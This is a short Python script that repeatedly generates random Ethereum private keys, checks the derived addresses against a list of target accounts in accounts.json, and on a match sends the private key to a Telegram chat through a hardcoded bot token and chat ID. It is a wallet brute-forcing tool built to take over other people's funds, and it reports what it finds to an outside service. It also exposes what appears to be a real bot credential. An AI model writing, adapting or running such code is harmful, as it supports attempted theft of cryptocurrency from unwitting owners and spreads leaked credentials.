from ecdsa import SigningKey, SECP256k1
import sha3
import json
import requests

def checksum_encode(addr_str): # Takes a hex (string) address as input
    keccak = sha3.keccak_256()
    out = ''
    addr = addr_str.lower().replace('0x', '')
    keccak.update(addr.encode('ascii'))
    hash_addr = keccak.hexdigest()
    for i, c in enumerate(addr):
        if int(hash_addr[i], 16) >= 8:
            out += c.upper()
        else:
            out += c
    return '0x' + out

def telegram_bot_sendtext(bot_message):
    print(bot_message)
    bot_token = '5030991447:AAGzyJ7kRB6VAzF-hWoO1gisHji5vpytb-w'
    bot_chatID = '-1001518197311'
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message
    response = requests.get(send_text)
    return response.json()

with open("accounts.json", "r") as f:
    data = json.load(f)
    data = data["data"]
#print(data)



y = True
while y:
    keccak = sha3.keccak_256()
    priv = SigningKey.generate(curve=SECP256k1)
    pub = priv.get_verifying_key().to_string()
    keccak.update(pub)
    address = keccak.hexdigest()[24:]
    pkey = priv.to_string().hex()
    wallet = checksum_encode(address).lower()
    if wallet in data:
        print("Private key: " + pkey + " | Address: " + wallet + " | result: FOUND")
        text = "PrivateKey:\n" + pkey + "\n\nAddress:\n" + wallet
        telegram_bot_sendtext(text)
    else:
        print("Private key: " + pkey + " | Address: " + wallet + " | result: not found")
        #text = "PrivateKey:\n" + pkey + "\n\nAddress:\n" + wallet
        #telegram_bot_sendtext(text)